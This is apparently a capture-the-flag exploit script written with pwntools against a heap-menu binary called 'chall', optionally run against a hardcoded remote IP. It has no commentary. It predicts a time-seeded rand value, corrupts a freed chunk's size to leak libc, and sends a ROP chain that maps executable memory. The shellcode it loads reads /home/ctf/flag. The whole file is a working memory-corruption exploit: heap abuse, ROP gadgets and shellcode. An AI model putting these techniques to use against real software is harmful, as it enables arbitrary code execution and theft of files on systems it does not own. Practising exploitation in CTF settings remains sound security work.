#!/usr/bin/python
from pwn import *
import sys
import ctypes

ctypes.cdll.LoadLibrary("libc.so.6")
lc = ctypes.CDLL("libc.so.6")

LOCAL = True

HOST = "35.245.143.0"
PORT = 7777

AGE = 0

def calcage():
	v4 = lc.time(None)
	
	a1 = 0

	while a1 <= 4095:
		seed = v4 / 0x3c
		lc.srand(int(seed))

		v1 = lc.rand() % 0xf000 + 4096
		v4 += lc.rand() % 300 + 1

		lc.srand(int(v4 / 0x1e))

		v2 = lc.rand() % 0xf000 + 4096

		a1 = v2 & 0xffff
		a1 &= v1

	return a1

def enroll(idx, size, detail):
	r.sendline("1")
	r.sendlineafter(": ", str(idx))
	r.sendlineafter(": ", str(size))
	r.recvline()
	r.send(detail)
	r.recvuntil(">> ")

def view(idx):
	r.sendline("2")
	r.sendlineafter(": ", str(idx))
	r.recvuntil(": ")
	LEAK = r.recvuntil("Secret Service", drop=True)
	r.recvuntil(">> ")
	return LEAK

def inc_chunksize(idx):
	r.sendline("2020")
	r.sendlineafter(": ", str(idx))
	r.recvuntil(">> ")

def rem(idx):
	r.sendline("3")
	r.sendlineafter(": ", str(idx))	
	r.recvuntil(">> ")

def exploit(r):
	name = "AAAA"

	r.recvline()
	r.sendlineafter(": ", name)
	r.sendlineafter(": ", str(AGE))
	r.recvuntil(">> ")

	# create chunk and free it
	enroll(0, 0x800, "A"*0x800)
	rem(0)

	# set IS_MMAPPED bit in free chunk size
	inc_chunksize(0)
	inc_chunksize(0)

	# reallocate it
	enroll(0, 0xd20-8, "A")

	# read libc address from allocated chunk
	LEAK = u64(view(0)[:6].ljust(8, b"\x00")) - 0x41 + 0xe0

	libc.address = LEAK - 0x70 - libc.symbols["__malloc_hook"]

	log.info("LEAK          : %s" % hex(LEAK))
	log.info("LIBC          : %s" % hex(libc.address))

	r.sendline("4")
	r.recvline()
	r.sendline("y")
	r.recvuntil(": ")
	r.sendline("-1")
	r.recvuntil(": ")

	pause()

	POPRDI = libc.address + 0x26b72
	POPRSI = libc.address + 0x27529
	POPRDXRBX = libc.address + 0x1626d6
	POPRCX = libc.address + 0x9f822
	SYSCALL = libc.address + 0x66229
	POPRAX = libc.address + 0x4a550		
	CLEARR8 = libc.address + 0x0000000000049dfd
	CLEARR9 = libc.address + 0x00000000000c9ccf
	MOVR10RDXJMPRAX = libc.address + 0x000000000007b0cb
	RET = libc.address + 0x0000000000025679

	payload = b"A"*(136-8)
	payload += p64(0xcafebabe)
	
	# mmap
	payload += p64(POPRDI)
	payload += p64(0x40000)
	payload += p64(POPRSI)
	payload += p64(0x1000)
	payload += p64(POPRDXRBX)
	payload += p64(0x22)
	payload += p64(0x22)
	payload += p64(POPRAX)	# prepare for mov r10
	payload += p64(RET)
	payload += p64(MOVR10RDXJMPRAX)
	payload += p64(POPRDXRBX)
	payload += p64(7)
	payload += p64(0x22)
	payload += p64(CLEARR8)
	payload += p64(CLEARR9)
	payload += p64(POPRAX)
	payload += p64(9)
	payload += p64(POPRCX)
	payload += p64(0x22)
	payload += p64(SYSCALL)

	# read
	payload += p64(POPRAX)
	payload += p64(0)
	payload += p64(POPRDI)
	payload += p64(0)
	payload += p64(POPRSI)
	payload += p64(0x40000)
	payload += p64(POPRDXRBX)
	payload += p64(0x400)
	payload += p64(0)
	payload += p64(SYSCALL)
	payload += p64(0x40000)				# jmp to shellcode
	payload += b"A"*(4000-len(payload))	# pad to overwrite tcb canary

	r.sendline(payload)

	SC = """	
		// openat
		mov rax, 0x101
		mov rdi, -1
		mov rsi, 0x40200
		xor rdx, rdx
		mov rcx, 0
		syscall

		// dup file to stdin
		xor rax, rax
		mov al, 0x21
		mov rdi, 5
		mov rsi, 0
		syscall

		// read file
		xor rax, rax
		mov rdi, 0
		mov rsi, 0x40300
		mov rdx, 100
		syscall

		// reopen stdout
		xor rax, rax
		mov al, 0x21
		mov rdi, 3
		mov rsi, 1
		syscall

		// write output
		xor rax, rax
		mov al, 1
		xor rdi, rdi
		mov rdi, 1
		xor rsi, rsi
		mov rsi, 0x40300
		mov rdx, 0x100
		syscall
	"""

	pause()

	context.arch="amd64"

	payload = asm(SC)
	payload += b"\x90"*(0x200-len(payload))
	payload += b"/home/ctf/flag\x00"

	r.sendline(payload)

	r.interactive()

	
	return

if __name__ == "__main__":
	libc = ELF("./libc.so.6")

	AGE = calcage()

	if len(sys.argv) > 1:
		LOCAL = False
		r = remote(HOST, PORT)
		exploit(r)
	else:
		LOCAL = True
		r = process("./chall", env={"LD_PRELOAD":"./libc.so.6"})
		print (util.proc.pidof(r))
		pause()
		exploit(r)
